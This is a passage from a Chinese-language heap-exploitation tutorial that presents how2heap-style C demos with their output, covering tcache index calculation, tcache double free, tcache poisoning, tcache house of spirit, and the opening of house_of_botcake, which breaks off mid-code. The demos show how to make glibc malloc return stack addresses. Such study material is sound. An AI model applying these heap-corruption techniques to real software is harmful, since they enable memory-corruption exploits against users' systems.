</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It is calculated as follows:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>IF x &lt;MINSIZE(0x%lx) CHUNKSIZE = MINSIZE (0x%lx)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>,</span> <span class=n>MINSIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>=&gt; CHUNKSIZE = (x + 0x%lx + 0x%lx) &amp; ~0x%lx)</span><span class=se>\n\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=n>MALLOC_ALIGN_MASK</span><span class=p>,</span> <span class=n>MALLOC_ALIGN_MASK</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%llx&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>req</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>tidx</span> <span class=o>=</span> <span class=nf>usize2tidx</span><span class=p>(</span><span class=n>req</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>tidx</span><span class=o>&gt;</span> <span class=mi>63</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>WARNING: NOT IN TCACHE RANGE!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>TCache Idx: %llu</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>tidx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file doesn&#39;t demonstrate an attack, but calculates the tcache idx for a given chunk size.
The basic formula is as follows:
    (IDX = CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
    On a 64 bit system the current values are:
        MINSIZE: 0x20
        MALLOC_ALIGNMENT: 0x10
    So we get the following equation:
    (IDX = CHUNKSIZE - 0x11) / 0x10

BUT be AWARE that CHUNKSIZE is not the x in malloc(x)
It is calculated as follows:
    IF x &lt;MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
    ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
    =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf)


[CTRL-C to exit] Please enter a size x (malloc(x)) in hex (e.g. 0x10): 0x10

TCache Idx: 0
</code></pre><p>关于 tcache 介绍可以参考 <a href=http://tukan.farm/2017/07/08/tcache/ target=_blank>这里</a>。</p><p>这个例子说明了 tcache 的索引是如何分配的，需要注意的是 <code>CHUNKSIZE</code> 是经过 <code>request2size</code> 转化后的大小，也就是 chunk 的实际大小。tcache 索引 <code>IDX</code> 可以由上面的公式得到。</p><h2 id=tcache_dup class="relative group">tcache_dup <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#tcache_dup aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple double-free attack with tcache.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing twice...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Next allocated buffers will be same: [%p, %p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>),</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x1a90260
Freeing twice...
Now the free list has [0x1a90260, 0x1a90260].
Next allocated buffers will be same: [0x1a90260, 0x1a90260].
</code></pre><p>和 fastbin 类似，tcache 也存在 double free，而且还没有链表头检查，因此只需要连续两次 free 就好了，更加简单。</p><h2 id=tcache_poisoning class="relative group">tcache_poisoning <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#tcache_poisoning aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;returning a pointer to an arbitrary location (in this case, the stack).</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;The attack is very similar to fastbin corruption attack.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The address we want malloc() to return is %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 1 buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the buffer...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the tcache list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We overwrite the first %lu bytes (fd/next pointer) of the data at %p</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;to point to the location to control (%p).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>intptr_t</span><span class=p>),</span> <span class=n>a</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>intptr_t</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the tcache list has [%p].</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>128</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(128): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We got the control</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7ffd4941b420.
Allocating 1 buffer.
malloc(128): 0x1601260
Freeing the buffer...
Now the tcache list has [0x1601260].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x1601260
to point to the location to control (0x7ffd4941b420).
1st malloc(128): 0x1601260
Now the tcache list has [0x7ffd4941b420].
2nd malloc(128): 0x7ffd4941b420
We got the control
</code></pre><p>和 <code>fastbin_dup_into_stack</code> 类似，改写已经 <code>free</code> 掉的 chunk 的 <code>fd</code> 指向栈上地址，然后 <code>malloc</code> 两次即可分配到栈上。</p><h2 id=tcache_house_of_spirit class="relative group">tcache_house_of_spirit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#tcache_house_of_spirit aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates the house of spirit attack on tcache.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;(Search for strings </span><span class=se>\&#34;</span><span class=s>invalid next size</span><span class=se>\&#34;</span><span class=s>and </span><span class=se>\&#34;</span><span class=s>double free or corruption</span><span class=se>\&#34;</span><span class=s>)</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Ok. Let&#39;s start with the example!.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Calling malloc() once so that it sets up its memory.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=o>*</span><span class=n>a</span><span class=p>;</span> <span class=c1>//pointer that will be overwritten
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>10</span><span class=p>];</span> <span class=c1>//fake chunk region
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This region contains one fake chunk. It&#39;s size field is placed at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>;</span> <span class=c1>// this is the size
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>a</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the overwritten pointer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>fake_chunks</span><span class=p>[</span><span class=mi>2</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(0x30): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x30</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates the house of spirit attack on tcache.
It works in a similar way to original house of spirit but you don&#39;t need to create fake chunk after the fake chunk that will be freed.
You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#39;s size and prev_inuse are sane.
(Search for strings&#34;invalid next size&#34;and&#34;double free or corruption&#34;)

Ok. Let&#39;s start with the example!.

Calling malloc() once so that it sets up its memory.
Let&#39;s imagine we will overwrite 1 pointer to point to a fake chunk region.
This region contains one fake chunk. It&#39;s size field is placed at 0x7ffe46748fb8
This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffe46748fb8.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffe46748fb8, which will be 0x7ffe46748fc0!
malloc(0x30): 0x7ffe46748fc0
</code></pre><p>依然非常简单。相比传统 house of spirit，tcache 中不会检查被释放的 chunk 的下一个 chunk 的 <code>chunk_size</code> 字段。那么我们只要保证 fake chunk 本身的大小合法（实际上就是位于 small bin 范围内）就可以了。随后将 fake chunk 的 <code>mem</code> 指针赋值给 <code>a</code>，<code>free(a)</code> 就将 fake chunk 放进了 tcache，再次 <code>malloc</code> 即可拿到 fake chunk。</p><h2 id=house_of_botcake class="relative group">house_of_botcake <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#house_of_botcake aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;assert.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     * This attack should bypass the restriction introduced in
</span></span></span><span class=line><span class=cl><span class=cm>     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
</span></span></span><span class=line><span class=cl><span class=cm>     * If the libc does not include the restriction, you can simply double free the victim and do a
</span></span></span><span class=line><span class=cl><span class=cm>     * simple tcache poisoning
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// disable buffering and make _FILE_IO does not interfere with our heap
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// introduction
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;returning a pointer to an arbitrary location (in this demo, the stack).&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;This attack only relies on double free.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// prepare the target
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>intptr_t</span> <span class=n>stack_var</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;The address we want malloc() to return, namely,&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;the target address is %p.</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// prepare heap layout
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Preparing heap layout&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>7</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=kt>int</span> <span class=n>i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>&lt;</span><span class=k>sizeof</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=o>/</span><span class=k>sizeof</span><span class=p>(</span><span class=kt>intptr_t</span><span class=o>*</span><span class=p>);</span> <span class=n>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Allocating a chunk for later consolidation&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>prev</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Allocating the victim chunk.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>intptr_t</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;malloc(0x100): a=%p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Allocating a padding to prevent consolidation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// cause chunk overlapping
